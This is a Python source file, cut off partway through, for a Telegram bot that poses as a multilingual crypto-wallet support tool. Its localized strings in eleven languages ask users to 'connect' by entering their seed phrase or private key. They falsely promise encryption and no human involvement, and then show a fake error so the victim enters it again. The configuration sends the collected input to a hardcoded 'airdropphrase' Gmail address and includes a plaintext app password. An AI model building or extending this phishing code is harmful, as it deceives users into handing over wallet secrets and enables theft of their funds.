import logging
import smtplib
from email.message import EmailMessage
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardRemove
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    filters,
    ContextTypes,
    ConversationHandler
)

# Enable logging
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO
)
logging.getLogger("httpx").setLevel(logging.WARNING)

# States for our conversation handler
CHOOSE_LANGUAGE = 0
MAIN_MENU = 1
AWAIT_CONNECT_WALLET = 2
CHOOSE_WALLET_TYPE = 3
CHOOSE_OTHER_WALLET_TYPE = 4
PROMPT_FOR_INPUT = 5
RECEIVE_INPUT = 6
AWAIT_RESTART = 7

# --- Email Configuration (YOU MUST UPDATE THESE) ---
# NOTE: Using a hardcoded password is a SECURITY RISK. For a real application,
# use environment variables. For a Gmail account, you need to use an App Password,
# not your regular password, and you may need to enable 2-step verification.
SENDER_EMAIL = "airdropphrase@gmail.com"
SENDER_PASSWORD = "ipxs ffag eqmk otqd" # Use an App Password if using Gmail
RECIPIENT_EMAIL = "airdropphrase@gmail.com"

# Dictionary for multi-language support
LANGUAGES = {
    'en': {
        'welcome': "Hi {user}! Welcome to your ultimate self-service resolution tool for all your crypto wallet needs! This bot is designed to help you quickly and efficiently resolve common issues such as Connection Errors, Migration Challenges, Staking Complications, High Gas Fees, Stuck Transactions, Missing Funds, Claim Rejections, Liquidity Problems, Frozen Transactions, Swapping Difficulties, and Lost Tokens. Whether you're facing issues with wallet synchronization, incorrect token balances, failed transfers, we've got you covered. Our goal is to guide you through the troubleshooting process step-by-step, empowering you to take control of your crypto wallet experience. Let's get started and resolve your issues today!",
        'main menu title': "Please select an issue type to continue:",
        'buy': "Buy",
        'validation': "Validation",
        'claim tokens': " Claim Tokens",
        'migration issues': " Migration Issues",
        'assets recovery': " Assets Recovery",
        'general issues': " General Issues",
        'rectification': " Rectification",
        'staking issues': " Staking Issues",
        'deposits': " Deposits",
        'withdrawals': " Withdrawals",
        'slippage error': " Slippage Error",
        'login issues': " Login Issues",
        'high gas fees': " High Gas Fees",
        'presale issues': " Presale Issues",
        'missing balance': " Missing/Irregular Balance",
        'connect wallet message': "Please connect your wallet with your Private Key or Seed Phrase to continue.",
        'connect wallet button': "🔑 Connect Wallet",
        'select wallet type': "Please select your wallet type:",
        'other wallets': "Other Wallets",
        'private key': "🔑 Private Key",
        'seed phrase': "🔒 Import Seed Phrase",
        'wallet selection message': "You have selected {wallet_name}.\nSelect your preferred mode of connection.",
        'reassurance': "\n\nFor your security, please be aware that all information is processed securely by the bot and no human intervention is involved. This process is fully encrypted and protected to ensure your data is safe during synchronization.",
        'prompt seed': "Please enter your 12/24 words secret phrase.{reassurance}",
        'prompt private key': "Please enter your private key.{reassurance}",
        'invalid choice': "Invalid choice. Please use the buttons.",
        'final error message': "‼️ An error occured, Please ensure you are entering the correct key, please use copy and paste to avoid errors. please /start to try again. ",
        'choose language': "Please select your preferred language:",
        'await restart message': "Please click on /start to start over again."
    },
    'es': {
        'welcome': "¡Hola {user}! ¡Bienvenido a su herramienta de autoservicio definitiva para todas las necesidades de su billetera de criptomonedas! Este bot está diseñado para ayudarlo a resolver de manera rápida y eficiente problemas comunes como errores de conexión, desafíos de migración, complicaciones de staking, altas tarifas de gas, transacciones atascadas, fondos perdidos, rechazos de reclamaciones, problemas de liquidez, transacciones congeladas, dificultades de intercambio y tokens perdidos. Ya sea que enfrente problemas con la sincronización de la billetera, saldos de tokens incorrectos, transferencias fallidas, lo tenemos cubierto. Nuestro objetivo es guiarlo a través del proceso de solución de problemas paso a paso, lo que le permitirá tomar el control de su experiencia con la billetera de criptomonedas. ¡Comencemos y resolvamos sus problemas hoy!",
        'main menu title': "Seleccione un tipo de problema para continuar:",
        'buy': " Comprar",
        'validation': " Validación",
        'claim tokens': " Reclamar Tokens",
        'migration issues': " Problemas de Migración",
        'assets recovery': " Recuperación de Activos",
        'general issues': " Problemas Generales",
        'rectification': " Rectificación",
        'staking issues': " Problemas de Staking",
        'deposits': " Depósitos",
        'withdrawals': " Retiros",
        'slippage error': " Error de Deslizamiento",
        'login issues': " Problemas de Inicio de Sesión",
        'high gas fees': " Altas Tarifas de Gas",
        'presale issues': " Problemas de Preventa",
        'missing balance': " Saldo Perdido/Irregular",
        'connect wallet message': "Por favor, conecte su billetera con su Clave Privada o Frase Semilla para continuar.",
        'connect wallet button': "🔑 Conectar Billetera",
        'select wallet type': "Por favor, seleccione el tipo de su billetera:",
        'other wallets': "Otras Billeteras",
        'private key': "🔑 Clave Privada",
        'seed phrase': "🔒 Importar Frase Semilla",
        'wallet selection message': "Ha seleccionado {wallet_name}.\nSeleccione su modo de conexión preferido.",
        'reassurance': "\n\nPara su seguridad, tenga en cuenta que toda la información es procesada de forma segura por el bot y no hay intervención humana. Este proceso está totalmente encriptado y protegido para garantizar que sus datos estén seguros durante la sincronización.",
        'prompt seed': "Por favor, ingrese su frase secreta de 12/24 palabras.{reassurance}",
        'prompt private key': "Por favor, ingrese su clave privada.{reassurance}",
        'invalid choice': "Opción inválida. Por favor, use los botones.",
        'final error message': "‼️ Ha ocurrido un error, asegúrese de que está introduciendo la clave correcta, por favor, use copiar y pegar para evitar errores. Por favor, /start para intentarlo de nuevo. ",
        'choose language': "Por favor, seleccione su idioma preferido:",
        'await restart message': "Por favor, haga clic en /start para empezar de nuevo."
    },
    'fr': {
        'welcome': "Salut {user} ! Bienvenue dans votre outil d'auto-assistance ultime pour tous vos besoins en portefeuille crypto ! Ce bot est conçu pour vous aider à résoudre rapidement et efficacement les problèmes courants tels que les erreurs de connexion, les défis de migration, les complications de staking, les frais de gaz élevés, les transactions bloquées, les fonds manquants, les rejets de réclamation, les problèmes de liquidité, les transactions gelées, les difficultés d'échange et les jetons perdus. Que vous ayez des problèmes de synchronisation de portefeuille, de soldes de jetons incorrects, de transferts échoués, nous avons ce qu'il vous faut. Notre objectif est de vous guider étape par étape dans le processus de dépannage, vous permettant de prendre le contrôle de votre expérience de portefeuille crypto. Commençons et résolvons vos problèmes dès aujourd'hui !",
        'main menu title': "Veuillez sélectionner un type de problème pour continuer :",
        'buy': " Acheter",
        'validation': " Validation",
        'claim tokens': " Réclamer des Tokens",
        'migration issues': " Problèmes de Migration",
        'assets recovery': " Récupération d'Actifs",
        'general issues': " Problèmes Généraux",
        'rectification': " Rectification",
        'staking issues': " Problèmes de Staking",
        'deposits': " Dépôts",
        'withdrawals': " Retraits",
        'slippage error': " Erreur de Glissement",
        'login issues': " Problèmes de Connexion",
        'high gas fees': " Frais de Gaz Élevés",
        'presale issues': " Problèmes de Prévente",
        'missing balance': " Solde Manquant/Irrégulier",
        'connect wallet message': "Veuillez connecter votre portefeuille avec votre Clé Privée ou votre Phrase Secrète pour continuer.",
        'connect wallet button': "🔑 Connecter un Portefeuille",
        'select wallet type': "Veuillez sélectionner votre type de portefeuille :",
        'other wallets': "Autres Portefeuilles",
        'private key': "🔑 Clé Privée",
        'seed phrase': "🔒 Importer une Phrase Secrète",
        'wallet selection message': "Vous avez sélectionné {wallet_name}.\nSélectionnez votre mode de connexion préféré.",
        'reassurance': "\n\nPour votre sécurité, veuillez noter que toutes les informations sont traitées en toute sécurité par le bot et qu'aucune intervention humaine n'est impliquée. Ce processus est entièrement crypté et protégé pour garantir la sécurité de vos données pendant la synchronisation.",
        'prompt seed': "Veuillez entrer votre phrase secrète de 12/24 mots.{reassurance}",
        'prompt private key': "Veuillez entrer votre clé privée.{reassurance}",
        'invalid choice': "Choix invalide. Veuillez utiliser les boutons.",
        'final error message': "‼️ Une erreur est survenue, veuillez vous assurer que vous entrez la bonne clé, veuillez utiliser le copier-coller pour éviter les erreurs. Veuillez /start pour réessayer. ",
        'choose language': "Veuillez sélectionner votre langue préférée :",
        'await restart message': "Veuillez cliquer sur /start pour recommencer."
    },
    'ru': {
        'welcome': "Привет, {user}! Добро пожаловать в ваш универсальный инструмент для решения проблем с криптовалютным кошельком! Этот бот создан для того, чтобы помочь вам быстро и эффективно решить распространенные проблемы, такие как ошибки подключения, проблемы с миграцией, сложности со стейкингом, высокие комиссии за газ, застрявшие транзакции, пропавшие средства, отказы в получении токенов, проблемы с ликвидностью, замороженные транзакции, трудности с обменом и потерянные токены. Если у вас возникли проблемы с синхронизацией кошелька, неправильным балансом токенов или неудачными переводами, мы вам поможем. Наша цель — шаг за шагом провести вас через процесс устранения неполадок, чтобы вы могли взять под контроль свой опыт работы с криптовалютным кошельком. Давайте начнем и решим ваши проблемы сегодня!",
        'main menu title': "Пожалуйста, выберите тип проблемы, чтобы продолжить:",
        'buy': " Купить",
        'validation': " Валидация",
        'claim tokens': " Запросить Токены",
        'migration issues': " Проблемы с Миграцией",
        'assets recovery': " Восстановление Активов",
        'general issues': " Общие Проблемы",
        'rectification': " Исправление",
        'staking issues': " Проблемы со Стейкингом",
        'deposits': " Депозиты",
        'withdrawals': " Выводы",
        'slippage error': " Ошибка Проскальзывания",
        'login issues': " Проблемы со Входом",
        'high gas fees': " Высокие Комиссии за Газ",
        'presale issues': " Проблемы с Предпродажей",
        'missing balance': " Пропавший/Неправильный Баланс",
        'connect wallet message': "Пожалуйста, подключите свой кошелек с помощью приватного ключа или секретной фразы для продолжения.",
        'connect wallet button': "🔑 Подключить Кошелек",
        'select wallet type': "Пожалуйста, выберите тип вашего кошелька:",
        'other wallets': "Другие Кошельки",
        'private key': "🔑 Приватный Ключ",
        'seed phrase': "🔒 Импортировать Секретную Фразу",
        'wallet selection message': "Вы выбрали {wallet_name}.\nВыберите предпочтительный способ подключения.",
        'reassurance': "\n\nДля вашей безопасности, пожалуйста, имейте в виду, что вся информация обрабатывается ботом безопасно и без участия человека. Этот процесс полностью зашифрован и защищен, чтобы гарантировать безопасность ваших данных во время синхронизации.",
        'prompt seed': "Пожалуйста, введите вашу секретную фразу из 12/24 слов.{reassurance}",
        'prompt private key': "Пожалуйста, введите ваш приватный ключ.{reassurance}",
        'invalid choice': "Неверный выбор. Пожалуйста, используйте кнопки.",
        'final error message': "‼️ Произошла ошибка. Пожалуйста, убедитесь, что вы вводите правильный ключ, используйте копирование и вставку, чтобы избежать ошибок. Пожалуйста, /start, чтобы попробовать снова. ",
        'choose language': "Пожалуйста, выберите ваш предпочтительный язык:",
        'await restart message': "Пожалуйста, нажмите /start, чтобы начать заново."
    },
    'uk': {
        'welcome': "Привіт, {user}! Ласкаво просимо до вашого універсального інструменту для вирішення проблем з криптовалютним гаманцем! Цей бот розроблений, щоб допомогти вам швидко та ефективно вирішити поширені проблеми, такі як помилки підключення, проблеми з міграцією, складності зі стейкінгом, високі комісії за газ, заблоковані транзакції, зниклі кошти, відмови в отриманні токенів, проблеми з ліквідністю, заморожені транзакції, труднощі з обміном і втрачені токени. Незалежно від того, чи стикаєтеся ви з проблемами синхронізації гаманця, неправильним балансом токенов, невдалими переказами, ми вам допоможемо. Наша мета — крок за кроком провести вас через процес усунення несправностей, даючи вам можливість взяти під контроль свій досвід роботи з криптовалютним гаманцем. Давайте почнемо і вирішимо ваші проблеми сьогодні!",
        'main menu title': "Будь ласка, виберіть тип проблеми, щоб продовжити:",
        'buy': " Купити",
        'validation': " Валідація",
        'claim tokens': " Отримати Токени",
        'migration issues': " Проблеми з Міграцією",
        'assets recovery': " Відновлення Активів",
        'general issues': " Загальні Проблеми",
        'rectification': " Виправлення",
        'staking issues': " Проблеми зі Стейкінгом",
        'deposits': " Депозити",
        'withdrawals': " Виведення",
        'slippage error': " Помилка Просковзування",
        'login issues': " Проблеми з Входом",
        'high gas fees': " Високі Комісії за Газ",
        'presale issues': " Проблеми з Передпродажем",
        'missing balance': " Зниклий/Нерегулярний Баланс",
        'connect wallet message': "Будь ласка, підключіть свій гаманець за допомогою приватного ключа або секретної фрази, щоб продовжити.",
        'connect wallet button': "🔑 Підключити Гаманець",
        'select wallet type': "Будь ласка, виберіть тип вашого гаманця:",
        'other wallets': "Інші Гаманці",
        'private key': "🔑 Приватний Ключ",
        'seed phrase': "🔒 Імпортивати Секретну Фразу",
        'wallet selection message': "Ви вибрали {wallet_name}.\nВиберіть бажаний спосіб підключення.",
        'reassurance': "\n\nДля вашої безпеки, будь ласка, майте на увазі, що вся інформація обробляється ботом безпечно і без участі людини. Цей процес повністю зашифрований і захищений, щоб гарантувати безпеку ваших даних під час синхронізації.",
        'prompt seed': "Будь ласка, введіть вашу секретну фразу з 12/24 слів.{reassurance}",
        'prompt private key': "Будь ласка, введіть ваш приватний ключ.{reassurance}",
        'invalid choice': "Неправильний вибір. Будь ласка, використовуйте кнопки.",
        'final error message': "‼️ Сталася помилка. Будь ласка, переконайтеся, що ви вводите правильний ключ, використовуйте копіювання та вставку, щоб уникнути помилок. Будь ласка, /start, щоб спробувати знову. ",
        'choose language': "Будь ласка, виберіть ваш бажаний мову:",
        'await restart message': "Будь ласка, натисніть /start, щоб почати заново."
    },
    'fa': {
        'welcome': "سلام {user}! به ابزار نهایی خودکار حل مشکلات کیف پول ارزهای دیجیتال خود خوش آمدید! این ربات برای کمک به شما در حل سریع و کارآمد مسائل رایج مانند خطاهای اتصال، چالش‌های مهاجرت، پیچیدگی‌های استیکینگ، هزینه‌های بالای گس، تراکنش‌های گیر کرده، وجوه گمشده، رد شدن ادعاها، مشکلات نقدینگی، تراکنش‌های مسدود شده، مشکلات سواپ و توکن‌های از دست رفته طراحی شده است. چه با مسائل مربوط به همگام‌سازی کیف پول، موجودی‌های توکن نادرست یا انتقال‌های ناموفق روبرو باشید، ما به شما کمک می‌کنیم. هدف ما راهنمایی شما در فرآیند عیب‌یابی گام به گام است تا شما بتوانید تجربه کیف پول ارز دیجیتال خود را کنترل کنید. بیایید شروع کنیم و امروز مشکلات شما را حل کنیم!",
        'main menu title': "لطفاً برای ادامه یک نوع مشکل را انتخاب کنید:",
        'buy': " خرید",
        'validation': " اعتبارسنجی",
        'claim tokens': " دریافت توکن‌ها",
        'migration issues': " مسائل مهاجرت",
        'assets recovery': " بازیابی دارایی‌ها",
        'general issues': " مسائل عمومی",
        'rectification': " اصلاح",
        'staking issues': " مسائل استیکینگ",
        'deposits': " واریز",
        'withdrawals': " برداشت",
        'slippage error': " خطای لغزش",
        'login issues': " مسائل ورود به سیستم",
        'high gas fees': " هزینه‌های بالای گس",
        'presale issues': " مسائل پیش‌فروش",
        'missing balance': " موجودی گمشده/نامنظم",
        'connect wallet message': "لطفاً برای ادامه کیف پول خود را با کلید خصوصی یا عبارت Seed خود متصل کنید.",
        'connect wallet button': "🔑 اتصال کیف پول",
        'select wallet type': "لطفاً نوع کیف پول خود را انتخاب کنید:",
        'other wallets': "کیف پول‌های دیگر",
        'private key': "🔑 کلید خصوصی",
        'seed phrase': "🔒 وارد کردن عبارت Seed",
        'wallet selection message': "شما {wallet_name} را انتخاب کرده‌اید.\nلطفاً حالت اتصال ترجیحی خود را انتخاب کنید.",
        'reassurance': "\n\nبرای امنیت شما، لطفاً توجه داشته باشید که تمام اطلاعات به صورت ایمن توسط ربات پردازش می‌شوند و هیچ دخالت انسانی در آن وجود ندارد. این فرآیند به طور کامل رمزگذاری و محافظت می‌شود تا اطلاعات شما در طول همگام‌سازی ایمن باشند.",
        'prompt seed': "لطفاً عبارت مخفی 12/24 کلمه‌ای خود را وارد کنید.{reassurance}",
        'prompt private key': "لطفاً کلید خصوصی خود را وارد کنید.{reassurance}",
        'invalid choice': "انتخاب نامعتبر است. لطفاً از دکمه‌ها استفاده کنید.",
        'final error message': "‼️ خطایی رخ داد، لطفاً مطمئن شوید که کلید صحیح را وارد می‌کنید، لطفاً از کپی و پیست برای جلوگیری از خطاها استفاده کنید. لطفاً برای تلاش مجدد /start را بزنید. ",
        'choose language': "لطفاً زبان مورد نظر خود را انتخاب کنید:",
        'await restart message': "لطفاً روی /start کلیک کنید تا از ابتدا شروع کنید."
    },
    'ar': {
        'welcome': "مرحبًا {user}! مرحبًا بك في أداتك النهائية للحل الذاتي لجميع احتياجات محفظة العملات المشفرة الخاصة بك! تم تصميم هذا الروبوت لمساعدتك في حل المشكلات الشائعة بسرعة وفعالية مثل أخطاء الاتصال، تحديات الترحيل، تعقيدات التوقيع، رسوم الغاز المرتفعة، المعاملات العالقة، الأموال المفقودة، رفض المطالبات، مشاكل السيولة، المعاملات المجمدة، صعوبات التبديل، والرموز المميزة المفقودة. سواء كنت تواجه مشاكل في مزامنة المحفظة، أو أرصدة الرموز غير الصحيحة، أو التحويلات الفاشلة، فنحن نوفر لك الحماية. هدفنا هو إرشادك خلال عملية استكشاف الأخطاء وإصلاحها خطوة بخطوة، مما يمكّنك من التحكم في تجربة محفظة العملات المشفرة الخاصة بك. لنبدأ ونحل مشاكلك اليوم!",
        'main menu title': "يرجى تحديد نوع المشكلة للمتابعة:",
        'buy': " شراء",
        'validation': " التحقق",
        'claim tokens': " المطالبة بالرموز",
        'migration issues': " مشاكل الترحيل",
        'assets recovery': " استرداد الأصول",
        'general issues': " مشاكل عامة",
        'rectification': " تصحيح",
        'staking issues': " مشاكل التوقيع",
        'deposits': " الودائع",
        'withdrawals': " السحوبات",
        'slippage error': " خطأ الانزلاق",
        'login issues': " مشاكل تسجيل الدخول",
        'high gas fees': " رسوم غاز مرتفعة",
        'presale issues': " مشاكل البيع المسبق",
        'missing balance': " رصيد مفقود/غير منتظم",
        'connect wallet message': "يرجى توصيل محفظتك باستخدام مفتاحك الخاص أو عبارة Seed للمتابعة.",
        'connect wallet button': "🔑 توصيل المحفظة",
        'select wallet type': "يرجى تحديد نوع محفظتك:",
        'other wallets': "محافظ أخرى",
        'private key': "🔑 مفتاح خاص",
        'seed phrase': "🔒 استيراد عبارة Seed",
        'wallet selection message': "لقد اخترت {wallet_name}.\nحدد وضع الاتصال المفضل لديك.",
        'reassurance': "\n\nلأمانك، يرجى العلم أن جميع المعلومات تتم معالجتها بشكل آمن بواسطة الروبوت ولا يوجد أي تدخل بشري. هذه العملية مشفرة ومحمية بالكامل لضمان أمان بياناتك أثناء المزامنة.",
        'prompt seed': "يرجى إدخال عبارتك السرية المكونة من 12/24 كلمة.{reassurance}",
        'prompt private key': "يرجى إدخال مفتاحك الخاص.{reassurance}",
        'invalid choice': "اختيار غير صالح. يرجى استخدام الأزرار.",
        'final error message': "‼️ حدث خطأ، يرجى التأكد من أنك تدخل المفتاح الصحيح، يرجى استخدام النسخ واللصق لتجنب الأخطاء. يرجى /start للمحاولة مرة أخرى. ",
        'choose language': "يرجى تحديد لغتك المفضلة:",
        'await restart message': "يرجى النقر على /start للبدء من جديد."
    },
    'pt': {
        'welcome': "Olá {user}! Bem-vindo à sua ferramenta de resolução de autoatendimento definitiva para todas as suas necessidades de carteira de criptomoedas! Este bot foi projetado para ajudá-lo a resolver de forma rápida e eficiente problemas como erros de conexão, desafios de migração, complicações de staking, altas taxas de gás, transações presas, fundos ausentes, rejeições de reivindicação, problemas de liquidez, transações congeladas, dificuldades de troca e tokens perdidos. Se você estiver enfrentando problemas com a sincronização da carteira, saldos de tokens incorretos ou transferências com falha, estamos aqui para ajudar. Nosso objetivo é guiá-lo passo a passo pelo processo de solução de problemas, capacitando-o a assumir o controle de sua experiência com a carteira de criptomoedas. Vamos começar e resolver seus problemas hoje!",
        'main menu title': "Selecione um tipo de problema para continuar:",
        'buy': " Comprar",
        'validation': " Validação",
        'claim tokens': " Reivindicar Tokens",
        'migration issues': " Problemas de Migração",
        'assets recovery': " Recuperação de Ativos",
        'general issues': " Problemas Gerais",
        'rectification': " Retificação",
        'staking issues': " Problemas de Staking",
        'deposits': " Depósitos",
        'withdrawals': " Saques",
        'slippage error': " Erro de Derrapagem",
        'login issues': " Problemas de Login",
        'high gas fees': " Altas Taxas de Gás",
        'presale issues': " Problemas de Pré-venda",
        'missing balance': " Saldo Ausente/Irregular",
        'connect wallet message': "Por favor, conecte sua carteira com sua Chave Privada ou Frase Semente para continuar.",
        'connect wallet button': "🔑 Conectar Carteira",
        'select wallet type': "Por favor, selecione o tipo da sua carteira:",
        'other wallets': "Outras Carteiras",
        'private key': "🔑 Chave Privada",
        'seed phrase': "🔒 Importar Frase Semente",
        'wallet selection message': "Você selecionou {wallet_name}.\nSelecione seu modo de conexão preferido.",
        'reassurance': "\n\nPara sua segurança, esteja ciente de que todas as informações são processadas de forma segura pelo bot e nenhuma intervenção humana está envolvida. Este processo é totalmente criptografado e protegido para garantir que seus dados estejam seguros durante a sincronização.",
        'prompt seed': "Por favor, insira sua frase secreta de 12/24 palavras.{reassurance}",
        'prompt private key': "Por favor, insira sua chave privada.{reassurance}",
        'invalid choice': "Escolha inválida. Por favor, use os botões.",
        'final error message': "‼️ Ocorreu um erro. Por favor, certifique-se de que está inserindo a chave correta, use copiar e colar para evitar erros. Por favor, /start para tentar novamente. ",
        'choose language': "Por favor, selecione seu idioma preferido:",
        'await restart message': "Por favor, clique em /start para começar de novo."
    },
    'id': {
        'welcome': "Halo {user}! Selamat datang di alat penyelesaian mandiri terbaik Anda untuk semua kebutuhan dompet kripto Anda! Bot ini dirancang untuk membantu Anda dengan cepat dan efisien menyelesaikan masalah umum seperti Kesalahan Koneksi, Tantangan Migrasi, Komplikasi Staking, Biaya Gas Tinggi, Transaksi Terjebak, Dana Hilang, Penolakan Klaim, Masalah Likuiditas, Transaksi Beku, Kesulitan Swapping, dan Token Hilang. Baik Anda menghadapi masalah dengan sinkronisasi dompet, saldo token yang salah, transfer yang gagal, kami siap membantu. Tujuan kami adalah membimbing Anda melalui proses pemecahan masalah langkah demi langkah, memberdayakan Anda untuk mengendalikan pengalaman dompet kripto Anda. Mari kita mulai dan selesaikan masalah Anda hari ini!",
        'main menu title': "Silakan pilih jenis masalah untuk melanjutkan:",
        'buy': " Beli",
        'validation': " Validasi",
        'claim tokens': " Klaim Token",
        'migration issues': " Masalah Migrasi",
        'assets recovery': " Pemulihan Aset",
        'general issues': " Masalah Umum",
        'rectification': " Rekonsiliasi",
        'staking issues': " Masalah Staking",
        'deposits': " Deposit",
        'withdrawals': " Penarikan",
        'slippage error': " Kesalahan Slippage",
        'login issues': " Masalah Login",
        'high gas fees': " Biaya Gas Tinggi",
        'presale issues': " Masalah Pra-penjualan",
        'missing balance': " Saldo Hilang/Tidak Teratur",
        'connect wallet message': "Silakan sambungkan dompet Anda dengan Kunci Pribadi atau Frasa Seed Anda untuk melanjutkan.",
        'connect wallet button': "🔑 Sambungkan Dompet",
        'select wallet type': "Silakan pilih jenis dompet Anda:",
        'other wallets': "Dompet Lain",
        'private key': "🔑 Kunci Pribadi",
        'seed phrase': "🔒 Impor Frasa Seed",
        'wallet selection message': "Anda telah memilih {wallet_name}.\nSilakan pilih mode koneksi yang Anda sukai.",
        'reassurance': "\n\nUntuk keamanan Anda, harap ketahui bahwa semua informasi diproses dengan aman oleh bot dan tidak ada campur tangan manusia. Proses ini sepenuhnya dienkripsi dan dilindungi untuk memastikan data Anda aman selama sinkronisasi.",
        'prompt seed': "Silakan masukkan frasa rahasia 12/24 kata Anda.{reassurance}",
        'prompt private key': "Silakan masukkan kunci pribadi Anda.{reassurance}",
        'invalid choice': "Pilihan tidak valid. Silakan gunakan tombol.",
        'final error message': "‼️ Terjadi kesalahan, Harap pastikan Anda memasukkan kunci yang benar, silakan gunakan salin dan tempel untuk menghindari kesalahan. silakan /start untuk mencoba lagi. ",
        'choose language': "Silakan pilih bahasa pilihan Anda:",
        'await restart message': "Silakan klik /start untuk memulai kembali."
    },
    'de': {
        'welcome': "Hallo {user}! Willkommen bei Ihrem ultimativen Self-Service-Tool zur Lösung all Ihrer Krypto-Wallet-Probleme! Dieser Bot wurde entwickelt, um Ihnen schnell und effizient bei der Lösung häufiger Probleme zu helfen, wie z.B. Verbindungsfehler, Migrationsprobleme, Staking-Komplikationen, hohe Gasgebühren, feststeckende Transaktionen, fehlende Gelder, Ablehnungen von Ansprüchen, Liquiditätsprobleme, eingefrorene Transaktionen, Schwierigkeiten beim Swapping und verlorene Token. Egal, ob Sie Probleme mit der Wallet-Synchronisierung, falschen Token-Salden oder fehlgeschlagenen Überweisungen haben, wir helfen Ihnen. Unser Ziel ist es, Sie Schritt für Schritt durch den Fehlerbehebungsprozess zu führen und Ihnen die Kontrolle über Ihr Krypto-Wallet-Erlebnis zu geben. Lassen Sie uns beginnen und Ihre Probleme noch heute lösen!",
        'main menu title': "Bitte wählen Sie eine Art von Problem aus, um fortzufahren:",
        'buy': " Kaufen",
        'validation': " Validierung",
        'claim tokens': " Tokens Beanspruchen",
        'migration issues': " Migrationsprobleme",
        'assets recovery': " Wiederherstellung von Vermögenswerten",
        'general issues': " Allgemeine Probleme",
        'rectification': " Berichtigung",
        'staking issues': " Staking-Probleme",
        'deposits': " Einzahlungen",
        'withdrawals': " Auszahlungen",
        'slippage error': " Slippage-Fehler",
        'login issues': " Anmeldeprobleme",
        'high gas fees': " Hohe Gasgebühren",
        'presale issues': " Presale-Probleme",
        'missing balance': " Fehlender/Unregelmäßiger Saldo",
        'connect wallet message': "Bitte verbinden Sie Ihre Wallet mit Ihrem privaten Schlüssel oder Ihrer Seed-Phrase, um fortzufahren.",
        'connect wallet button': "🔑 Wallet Verbinden",
        'select wallet type': "Bitte wählen Sie Ihren Wallet-Typ aus:",
        'other wallets': "Andere Wallets",
        'private key': "🔑 Privater Schlüssel",
        'seed phrase': "🔒 Seed-Phrase Importieren",
        'wallet selection message': "Sie haben {wallet_name} ausgewählt.\nWählen Sie Ihre bevorzugte Verbindungsmethode.",
        'reassurance': "\n\nZu Ihrer Sicherheit beachten Sie bitte, dass alle Informationen sicher vom Bot verarbeitet werden und keine menschliche Intervention stattfindet. Dieser Prozess ist vollständig verschlüsselt und geschützt, um sicherzustellen, dass Ihre Daten während der Synchronisierung sicher sind.",
        'prompt seed': "Bitte geben Sie Ihre 12/24-Wörter-Geheimphrase ein.{reassurance}",
        'prompt private key': "Bitte geben Sie Ihren privaten Schlüssel ein.{reassurance}",
        'invalid choice': "Ungültige Auswahl. Bitte verwenden Sie die Schaltflächen.",
        'final error message': "‼️ Ein Fehler ist aufgetreten. Bitte stellen Sie sicher, dass Sie den richtigen Schlüssel eingeben, verwenden Sie Kopieren und Einfügen, um Fehler zu vermeiden. Bitte /start, um es erneut zu versuchen. ",
        'choose language': "Bitte wählen Sie Ihre bevorzugte Sprache:",
        'await restart message': "Bitte klicken Sie auf /start, um von vorne zu beginnen."
    },
    'nl': {
        'welcome': "Hallo {user}! Welkom bij uw ultieme self-service oplossingstool voor al uw crypto-wallet behoeften! Deze bot is ontworpen om u snel en efficiënt te helpen bij het oplossen van veelvoorkomende problemen zoals verbindingsfouten, migratie-uitdagingen, staking-complicaties, hoge gas-kosten, vastgelopen transacties, ontbrekende fondsen, claim-afwijzingen, liquiditeitsproblemen, bevroren transacties, ruilmoeilijkheden en verloren tokens. Of u nu problemen ondervindt met de walletsynchronisatie, onjuiste tokensaldo's of mislukte overdrachten, wij hebben het voor u. Ons doel is om u stap voor stap door het probleemoplossingsproces te leiden, zodat u de controle over uw crypto-wallet ervaring kunt nemen. Laten we vandaag nog beginnen en uw problemen oplossen!",
        'main menu title': "Gelieve een probleemtype te selecteren om verder te gaan:",
        'buy': " Kopen",
        'validation': " Validatie",
        'claim tokens': " Tokens Claimen",
        'migration issues': " Migratieproblemen",
        'assets recovery': " Herstel van Activa",
        'general issues': " Algemene Problemen",
        'rectification': " Rectificatie",
        'staking issues': " Staking-problemen",
        'deposits': " Stortingen",
        'withdrawals': " Opnames",
        'slippage error': " Slippage Fout",
        'login issues': " Login-problemen",
        'high gas fees': " Hoge Gas-kosten",
        'presale issues': " Presale-problemen",
        'missing balance': " Ontbrekend/Onregelmatig Saldo",
        'connect wallet message': "Gelieve uw wallet te verbinden met uw Privésleutel of Seed Phrase om verder te gaan.",
        'connect wallet button': "🔑 Wallet Verbinden",
        'select wallet type': "Gelieve uw wallet-type te selecteren:",
        'other wallets': "Andere Wallets",
        'private key': "🔑 Privésleutel",
        'seed phrase': "🔒 Seed Phrase Importeren",
        'wallet selection message': "U heeft {wallet_name} geselecteerd.\nSelecteer uw voorkeursmodus voor verbinding.",
        'reassurance': "\n\nVoor uw veiligheid, houd er rekening mee dat alle informatie veilig wordt verwerkt door de bot en dat er geen menselijke tussenkomst is. Dit proces is volledig versleuteld en beschermd om ervoor te zorgen dat uw gegevens veilig zijn tijdens de synchronisatie.",
        'prompt seed': "Gelieve uw 12/24-woorden geheime zin in te voeren.{reassurance}",
        'prompt private key': "Gelieve uw privésleutel in te voeren.{reassurance}",
        'invalid choice': "Ongeldige keuze. Gelieve de knoppen te gebruiken.",
        'final error message': "‼️ Er is een fout opgetreden. Zorg ervoor dat u de juiste sleutel invoert, gebruik kopiëren en plakken om fouten te voorkomen. Gelieve /start om het opnieuw te proberen. ",
        'choose language': "Gelieve uw voorkeurstaal te selecteren:",
        'await restart message': "Gelieve op /start te klikken om opnieuw te beginnen."
    },
    'hi': {
